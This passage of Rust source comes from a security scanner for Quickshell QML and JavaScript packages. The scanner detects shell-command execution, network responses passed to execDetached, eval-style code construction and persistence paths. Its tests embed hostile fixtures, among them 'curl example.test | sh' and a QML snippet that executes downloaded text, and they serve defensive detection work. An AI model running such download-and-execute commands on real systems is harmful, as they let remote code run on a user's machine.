        source: &'a str,
        object: tree_sitter::Node<'a>,
    ) -> Option<tree_sitter::Node<'a>> {
        let _ = source;
        let mut cursor = object.walk();
        object
            .children(&mut cursor)
            .find(|child| matches!(child.kind(), "identifier" | "nested_identifier"))
    }

    /// Terminal segment of a (possibly dotted) type spelling: `QQ.Loader`
    /// and `Loader` both resolve to the `Loader` sink type.
    fn terminal_segment(type_text: &str) -> &str {
        type_text.rsplit('.').next().unwrap_or(type_text)
    }

    fn handle_object_definition(source: &str, node: tree_sitter::Node, outcome: &mut FileOutcome) {
        let Some(type_node) = object_type_node(source, node) else {
            return;
        };
        let type_name = terminal_segment(node_text(source, type_node));

        match type_name {
            "Process" => {
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
                if let Some(binding_value) = binding_value(source, node, "command") {
                    evaluate_execution_value(source, binding_value, SinkKind::Process, outcome);
                    // Command argv is a verified sink position (H2): literal
                    // arguments outside the tree surface typed rejections;
                    // in-tree literals resolve as invocation edges.
                    handle_reference_sink_value(
                        source,
                        binding_value,
                        SinkPosition::ProcessCommand,
                        outcome,
                    );
                }
            }
            "FileView" => {
                outcome.capabilities.push(occurrence(
                    Capability::FilesystemAccess,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
                if let Some(path_value) = binding_value(source, node, "path") {
                    let unwrapped = unwrap_expression_statement(path_value);
                    match classify_value(source, path_value) {
                        Value::Static(text) => {
                            // Persistence locations: writing toward autostart
                            // or user-systemd units is a context finding.
                            if text.contains("autostart")
                                || text.contains("systemd/user")
                                || text.contains(".config/systemd")
                            {
                                outcome.result_parts.push(parts(
                                    PERSISTENCE_RULE,
                                    number_of(unwrapped),
                                    format!("persistence-location:{text}"),
                                    Confidence::AstBacked,
                                ));
                            }
                            // FileView.path is a verified sink position (H2):
                            // the path participates in reference resolution
                            // with typed rejections, never load-sink findings.
                            handle_reference_sink_value(
                                source,
                                path_value,
                                SinkPosition::FileViewPath,
                                outcome,
                            );
                        }
                        Value::Dynamic(_) => {
                            // Computed reference sink: explicit low-confidence
                            // finding per the S3 exit criterion.
                            outcome.result_parts.push(parts(
                                DYNAMIC_REFERENCE_RULE,
                                number_of(unwrapped),
                                format!(
                                    "dynamic-reference-sink:FileView.path:{}",
                                    node_text(source, unwrapped)
                                        .chars()
                                        .take(120)
                                        .collect::<String>()
                                ),
                                Confidence::AstBacked,
                            ));
                        }
                    }
                }
            }
            "Timer" => {
                outcome.capabilities.push(occurrence(
                    Capability::PersistenceScheduling,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
            }
            _ => {}
        }
    }

    /// The value expression of `property: value` inside one object
    /// definition. Bindings sit one level down, in the initializer.
    fn binding_value<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        binding_value_named(source, object, property)
    }

    fn binding_value_named<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        let mut outer = object.walk();
        let initializer = object
            .children(&mut outer)
            .find(|child| child.kind() == "ui_object_initializer")?;
        let mut cursor = initializer.walk();
        for child in initializer.children(&mut cursor) {
            if child.kind() != "ui_binding" {
                continue;
            }
            let mut binding_cursor = child.walk();
            let parts: Vec<tree_sitter::Node> = child.children(&mut binding_cursor).collect();
            let Some(name_node) = parts.first() else {
                continue;
            };
            if node_text(source, *name_node) != property {
                continue;
            }
            // Skip the ':' and take the expression after it.
            return parts.iter().rev().find(|part| part.kind() != ":").copied();
        }
        None
    }

    fn classify_value(source: &str, node: tree_sitter::Node) -> Value {
        let inner = unwrap_expression_statement(node);
        match inner.kind() {
            "string" => Value::Static(string_literal_content(source, inner)),
            "template_string" => {
                let mut cursor = inner.walk();
                let has_substitution = inner
                    .children(&mut cursor)
                    .any(|child| child.kind() == "template_substitution");
                if has_substitution {
                    Value::Dynamic("dynamic-command")
                } else {
                    Value::Static(template_plain_content(source, inner))
                }
            }
            "array" => {
                let mut elements = Vec::new();
                let mut cursor = inner.walk();
                for child in inner.children(&mut cursor) {
                    if matches!(child.kind(), "[" | "]" | "," | ";" | "\"" | "'") {
                        continue;
                    }
                    match classify_value(source, child) {
                        Value::Static(text) => elements.push(text),
                        Value::Dynamic(reason) => return Value::Dynamic(reason),
                    }
                }
                Value::Static(elements.join(" "))
            }
            _ => {
                // Provenance marker: does this expression read network
                // response data? Checked over the raw slice so any nesting
                // depth counts.
                let text = node_text(source, inner);
                if text.contains("responseText")
                    || text.contains(".response")
                    || text.contains(".text(")
                {
                    Value::Dynamic("network-response-executed")
                } else {
                    Value::Dynamic("dynamic-command")
                }
            }
        }
    }

    fn unwrap_expression_statement<'a>(node: tree_sitter::Node<'a>) -> tree_sitter::Node<'a> {
        let mut current = node;
        loop {
            let mut cursor = current.walk();
            let named: Vec<tree_sitter::Node> = current
                .children(&mut cursor)
                .filter(|child| child.is_named())
                .collect();
            match (current.kind(), named.as_slice()) {
                ("expression_statement" | "parenthesized_expression", [single]) => {
                    current = *single
                }
                _ => return current,
            }
        }
    }

    /// Runtime content of a string literal: fragments verbatim plus each
    /// escape_sequence node decoded individually, so classification sees
    /// what the engine evaluates (`"\x68ttps://…"` is an `https://` load,
    /// H2 review) without re-decoding literal backslashes a `\\` escape
    /// produced.
    fn string_literal_content(source: &str, string_node: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = string_node.walk();
        for child in string_node.children(&mut cursor) {
            match child.kind() {
                "string_fragment" => content.push_str(node_text(source, child)),
                "escape_sequence" => content.push_str(&decode_js_escapes(node_text(source, child))),
                _ => {}
            }
        }
        content
    }

    fn template_plain_content(source: &str, template: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = template.walk();
        for child in template.children(&mut cursor) {
            match child.kind() {
                "string_fragment" => content.push_str(node_text(source, child)),
                "escape_sequence" => content.push_str(&decode_js_escapes(node_text(source, child))),
                _ => {}
            }
        }
        content
    }

    /// Unwraps transparent `(…)` wrappers so a parenthesized receiver such as
    /// `(Qt).createComponent(...)` verifies as the same Qt-global call as
    /// `Qt.createComponent(...)`.
    fn unwrap_transparent_parens(mut node: tree_sitter::Node) -> tree_sitter::Node {
        while node.kind() == "parenthesized_expression" {
            match node.named_child(0) {
                Some(inner) => node = inner,
                None => break,
            }
        }
        node
    }

    fn handle_call_expression(
        source: &str,
        node: tree_sitter::Node,
        outcome: &mut FileOutcome,
        flags: &mut LexFlags,
    ) {
        let mut cursor = node.walk();
        let children: Vec<tree_sitter::Node> = node.children(&mut cursor).collect();
        let Some(callee) = children.first().copied() else {
            return;
        };
        let callee_name = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last).to_owned())
                    .unwrap_or_default()
            }
            "identifier" => node_text(source, callee).to_owned(),
            _ => String::new(),
        };
        // Qt-receiver verification (H2 review): `createComponent` and
        // `include` are Qt global APIs; a user-defined
        // `backend.createComponent(...)` must not carry Qt-specific rules.
        // `Qt.some.createComponent(...)` also fails verification (its
        // receiver is a member expression, not the Qt global).
        let qt_receiver = callee.kind() == "member_expression" && {
            let mut receiver_cursor = callee.walk();
            callee
                .children(&mut receiver_cursor)
                .next()
                .map(unwrap_transparent_parens)
                .is_some_and(|receiver| {
                    receiver.kind() == "identifier" && node_text(source, receiver) == "Qt"
                })
        };
        let is_qt_sink =
            qt_receiver && matches!(callee_name.as_str(), "createComponent" | "include");
        if matches!(callee_name.as_str(), "eval" | "createQmlObject" | "atob") || is_qt_sink {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number_of(node),
                format!("dynamic-code-construction:{callee_name}"),
                Confidence::AstBacked,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                Language::Qml,
                number_of(node),
                &callee_name,
            ));
        }
        // Qt.createComponent / Qt.include are also reference sinks (H2):
        // their first argument decides whether remote or out-of-tree content
        // is loaded, or which in-tree file the invocation edge points at.
        if is_qt_sink {
            let sink = if callee_name == "createComponent" {
                SinkPosition::CreateComponent
            } else {
                SinkPosition::Include
            };
            if let Some(arguments) = children.iter().find(|child| child.kind() == "arguments") {
                let mut args_cursor = arguments.walk();
                let args: Vec<tree_sitter::Node> = arguments
                    .children(&mut args_cursor)
                    .filter(|child| child.is_named())
                    .collect();
                if let Some(first) = args.first().copied() {
                    handle_reference_sink_value(source, first, sink, outcome);
                }
            }
        }
        let is_detached = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last) == "execDetached")
                    .unwrap_or(false)
            }
            "identifier" => node_text(source, callee) == "execDetached",
            _ => false,
        };
        if !is_detached {
            // fetch(...) / X.fetch(...): network capability.
            let fetch_call = match callee.kind() {
                "identifier" => node_text(source, callee) == "fetch",
                "member_expression" => {
                    let mut member_cursor = callee.walk();
                    callee
                        .children(&mut member_cursor)
                        .last()
                        .map(|last| node_text(source, last) == "fetch")
                        .unwrap_or(false)
                }
                _ => false,
            };
            if fetch_call {
                flags.network.get_or_insert(number_of(node));
                outcome.capabilities.push(occurrence(
                    Capability::NetworkAccess,
                    Language::Qml,
                    number_of(node),
                    "fetch()",
                ));
            }
            return;
        }
        flags.detached_any.get_or_insert(number_of(node));
        outcome.capabilities.push(occurrence(
            Capability::DetachedProcessExecution,
            Language::Qml,
            number_of(node),
            node_text(source, node)
                .chars()
                .take(200)
                .collect::<String>()
                .as_str(),
        ));
        // First argument after the callee's arguments '(' — reuse classification.
        if let Some(arguments) = children.iter().find(|child| child.kind() == "arguments") {
            let mut args_cursor = arguments.walk();
            let args: Vec<tree_sitter::Node> = arguments
                .children(&mut args_cursor)
                .filter(|child| child.is_named())
                .collect();
            if let Some(first) = args.first().copied() {
                evaluate_execution_value(source, first, SinkKind::DetachedExecution, outcome);
                // The executed path is also a reference sink (H2): a literal
                // outside the tree is a typed rejection, a literal inside it
                // resolves as an invocation edge.
                handle_reference_sink_value(source, first, SinkPosition::ExecDetached, outcome);
            }
        }
    }

    fn evaluate_execution_value(
        source: &str,
        value_node: tree_sitter::Node,
        kind: SinkKind,
        outcome: &mut FileOutcome,
    ) {
        let number = number_of(value_node);
        let rule_id = match kind {
            SinkKind::Process => PROCESS_RULE,
            SinkKind::DetachedExecution => DETACHED_RULE,
        };
        match classify_value(source, value_node) {
            Value::Static(text) => {
                if let Some(shell_offset) = find_shell_interpreter(&text) {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        format!(
                            "shell-interpreter-command:{}",
                            text.chars()
                                .skip(shell_offset)
                                .take(400)
                                .collect::<String>()
                        ),
                        Confidence::AstBacked,
                    ));
                }
            }
            Value::Dynamic(reason) => {
                let _ = kind;
                // A dynamic argument is only a finding when its visible
                // provenance is network response data; otherwise it stays a
                // capability observation (rule contract).
                if reason == "network-response-executed" {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        reason,
                        Confidence::AstBacked,
                    ));
                }
            }
        }
    }

    /// Route a sink binding/call argument into reference handling (H2). Only
    /// static-shaped values participate: string literals, substitution-free
    /// template strings, and arrays of those. Fragments of computed
    /// expressions are not resolvable references and would misclassify, so
    /// they stay capability/finding material for the dataflow slice.
    fn handle_reference_sink_value(
        source: &str,
        value: tree_sitter::Node,
        sink: SinkPosition,
        outcome: &mut FileOutcome,
    ) {
        let inner = unwrap_expression_statement(value);
        match inner.kind() {
            "string" => record_sink_reference(
                &string_literal_content(source, inner),
                sink,
                number_of(inner),
                outcome,
            ),
            "template_string" => {
                let mut cursor = inner.walk();
                let substituted = inner
                    .children(&mut cursor)
                    .any(|child| child.kind() == "template_substitution");
                if !substituted {
                    record_sink_reference(
                        &template_plain_content(source, inner),
                        sink,
                        number_of(inner),
                        outcome,
                    );
                }
            }
            "array" => {
                let mut cursor = inner.walk();
                let children: Vec<tree_sitter::Node> = inner
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .collect();
                for child in children {
                    handle_reference_sink_value(source, child, sink, outcome);
                }
            }
            _ => {}
        }
    }

    fn collect_ast_references(
        source: &str,
        tree: &tree_sitter::Tree,
        references: &mut Vec<ReferenceCandidate>,
    ) {
        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let text = match node.kind() {
                "string" => string_literal_content(source, node),
                "template_string" => template_plain_content(source, node),
                _ => String::new(),
            };
            if is_path_shaped(&text) {
                references.push(ReferenceCandidate {
                    line: number_of(node),
                    value: text,
                    sink: None,
                });
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }
    }
}

#[cfg(feature = "qml-parser")]
fn ast_scan_qml(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
    ast::scan(source, tree)
}

#[cfg(test)]
mod tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    #[expect(dead_code, reason = "used by the fallback-build test only")]
    fn one_file_inventory(relative: &str, kind: PayloadKind, size: usize) -> PayloadInventory {
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: relative.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        inventory
    }

    pub(crate) fn analyze_with(
        mut inventory: PayloadInventory,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::HashMap<&str, &[u8]> = contents
            .iter()
            .map(|(path, bytes)| (*path, *bytes))
            .collect();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| {
                lookup
                    .get(entry.relative_path.as_str())
                    .map(|bytes| bytes.to_vec())
            },
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    #[test]
    fn static_benign_process_is_capability_only() {
        let source = r#"
import Quickshell.Io
Process { command: ["notify-send", "hello"] }
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Main.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.results.is_empty(),
            "benign argv must not be a finding"
        );
        assert_eq!(
            inventory.entries[0].coverage_state,
            CoverageState::Analyzed,
            "capability observation counts as analysis output"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn shell_chain_argv_is_a_finding() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Evil.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1);
        assert_eq!(rendered[0].rule_id, PROCESS_RULE);
        assert_eq!(rendered[0].severity, "medium");
        assert!(
            rendered[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only() {
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        // A bare identifier has no visible suspicious provenance; the ability
        // is recorded, never a finding (rule contract).
        assert!(artifacts.rendered_findings().is_empty());
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn quoted_slashes_survive_but_comments_do_not() {
        // A quoted URL before a live command must not hide it, and a
        // commented-out call must never become a finding.
        let js_source = r#"var url = "https://example.test/a";
execDetached("echo ok"); // execDetached("sh -c curl evil | sh")
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comments.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(js_source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented chains are invisible; quoted URLs are inert: {:?}",
            artifacts.rendered_findings()
        );

        // Same line: a quoted URL must not hide a LIVE command binding that
        // follows it, even with a trailing comment after it.
        let js_same_line = "var u = \"https://example.test/a\"; Process { command: [\"sh\", \"-c\", \"curl evil | sh\"] } // tail\n";
        let mut same_line_inventory = PayloadInventory::default();
        same_line_inventory.entries.push(PayloadEntry {
            relative_path: "SameLine.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_same_line.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let same_line_artifacts = analyze_inventory(
            &mut same_line_inventory,
            &|_| Some(js_same_line.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let same_line_findings = same_line_artifacts.rendered_findings();
        assert_eq!(same_line_findings.len(), 1, "{same_line_findings:?}");
        assert!(
            same_line_findings[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );

        // Same shape as above, but the second call is LIVE: the finding
        // survives the earlier quoted URL and the trailing comment.
        let js_live = r#"var url = "https://example.test/a";
Process { command: "notify" }; execDetached(xhr.responseText) // note
"#;
        let mut live_inventory = PayloadInventory::default();
        live_inventory.entries.push(PayloadEntry {
            relative_path: "Live.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_live.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let live_artifacts = analyze_inventory(
            &mut live_inventory,
            &|_| Some(js_live.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = live_artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn later_suspicious_execdetached_on_one_line_is_not_masked() {
        // A benign first call must not suppress the suspicious second one,
        // even when they share a line inside a real handler body.
        let source = r#"Item {
    Component.onCompleted: {
        Quickshell.execDetached("echo ok"); Quickshell.execDetached(xhr.responseText)
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Mask.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].rule_id, DETACHED_RULE);
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn comments_never_feed_lexical_provenance() {
        let source = "Process { command: \"notify-send hi\" } // sh -c curl evil | sh\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comment.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented-out chains are not provenance: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only_lexical_parity() {
        // Lexical builds additionally cannot even see the flow; both must
        // agree that a bare identifier is never a finding.
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        assert!(artifacts.rendered_findings().is_empty());
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn network_response_reaching_execution_is_a_finding() {
        let source = r#"Item {
    Component.onCompleted: {
        var xhr = new XMLHttpRequest()
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Chain.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DETACHED_RULE);
        assert_eq!(rendered[0].evidence, "network-response-executed");
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn unrelated_network_and_execution_never_form_a_finding() {
        let source = r#"Item {
    Timer { onTriggered: statusText.text = "tick" }
    Process { command: ["notify-send", "done"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/api")
        xhr.send()
    } }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Calm2.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "co-occurrence without data flow must stay capability-only: {:?}",
            artifacts.rendered_findings()
        );
        let kinds: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(kinds.contains(&"network-access"));
        assert!(kinds.contains(&"process-execution"));
        // Capability records carry their covering-rule contract.
        for capability in &artifacts.capabilities {
            assert!(capability.source_rule_id.is_some(), "{capability:?}");
            assert!(!capability.explanation.is_empty());
            assert!(!capability.review_guidance.is_empty());
        }
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn computed_loader_source_is_an_explicit_low_confidence_finding() {
        let source = r#"Item {
    Loader { source: root.dynamicPath }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "DynRef.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DYNAMIC_REFERENCE_RULE);
        assert_eq!(rendered[0].severity, "low");
        assert_eq!(rendered[0].confidence.as_deref(), Some("ast-backed"));
        assert!(
            rendered[0]
                .evidence
                .starts_with("dynamic-reference-sink:Loader.source")
        );
    }
}

#[cfg(test)]
mod integration_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::Report;
    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    const EVIL_QML: &str = r#"
import QtQuick
import Quickshell.Io
Item {
    Process { command: ["sh", "-c", "curl example.test/p | sh"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/x")
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
        xhr.send()
    } }
    Loader { source: "./Helper.qml" }
}
"#;

    #[test]
    fn chained_network_execution_produces_network_finding() {
        let inventory = PayloadInventory {
            entries: vec![entry("Evil.qml", PayloadKind::Qml, EVIL_QML.len())],
            ..Default::default()
        };
        let expected = EVIL_QML.as_bytes().to_vec();
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("Evil.qml", &expected)]);
        let findings = artifacts.rendered_findings();
        let rules: Vec<&str> = findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect();
        assert!(rules.contains(&PROCESS_RULE), "{rules:?}");
        assert!(rules.contains(&DETACHED_RULE), "{rules:?}");
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
        // Every rendered finding carries the full report contract.
        for finding in artifacts.rendered_findings() {
            assert!(!finding.title.is_empty());
            assert!(!finding.explanation.is_empty());
            assert!(!finding.review_guidance.is_empty());
            assert!(finding.line.unwrap_or(0) >= 1);
            assert_eq!(
                finding.confidence.as_deref(),
                if cfg!(feature = "qml-parser") {
                    Some("ast-backed")
                } else {
                    Some("lexical-fallback")
                }
            );
        }
    }

    #[test]
    fn static_plain_execdetached_stays_capability_only() {
        let source = r#"Item { Component.onCompleted: Quickshell.execDetached("systemctl --user restart foo") }"#;
        let inventory = PayloadInventory {
            entries: vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) =
            super::tests::analyze_with(inventory, &[("Calm.qml", source.as_bytes())]);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE),
            "static plain detached execution is a capability, not a finding"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "detached-process-execution")
        );
    }

    #[test]
    fn standalone_javascript_is_lexical_with_chain_detection() {
        let source = r#"function run(url) {
    var xhr = new XMLHttpRequest()
    fetch("https://example.test/y")
    xhr.onreadystatechange = function() {
        execDetached(xhr.responseText)
    }
}
"#;
        let inventory = PayloadInventory {
            entries: vec![entry("helper.js", PayloadKind::JavaScript, source.len())],
            ..Default::default()
        };
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("helper.js", source.as_bytes())]);
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE
                    && finding.evidence == "network-response-executed"),
            "{findings:?}"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == NETWORK_RULE),
            "lexical co-occurrence alone must stay capability-only"
        );
        assert!(
            findings
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn invocation_edges_resolve_and_mark_targets() {
        let helper_qml = "Text { text: \"helper\" }\n";
        let script_js = "// referenced helper\n";
        let unreferenced_script = "#!/bin/sh\necho no-one-points-here\n";
        let shell_payload = PayloadEntry {
            kind: PayloadKind::Shell,
            executable: true,
            ..entry(
                "tools/run.sh",
                PayloadKind::Shell,
                unreferenced_script.len(),
            )
        };
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("App.qml", PayloadKind::Qml, EVIL_QML.len()),
                entry("Helper.qml", PayloadKind::Qml, helper_qml.len()),
                entry("scripts/lib.js", PayloadKind::JavaScript, script_js.len()),
                entry("orphan.sh", PayloadKind::Shell, unreferenced_script.len()),
                shell_payload,
            ],
            ..Default::default()
        };
        // App.qml references Helper.qml and scripts/lib.js; nothing references the shells.
        let app_source = format!("{}\nFileView {{ path: \"./scripts/lib.js\" }}\n", EVIL_QML);
        let contents: Vec<(&str, Vec<u8>)> = vec![
            ("App.qml", app_source.into_bytes()),
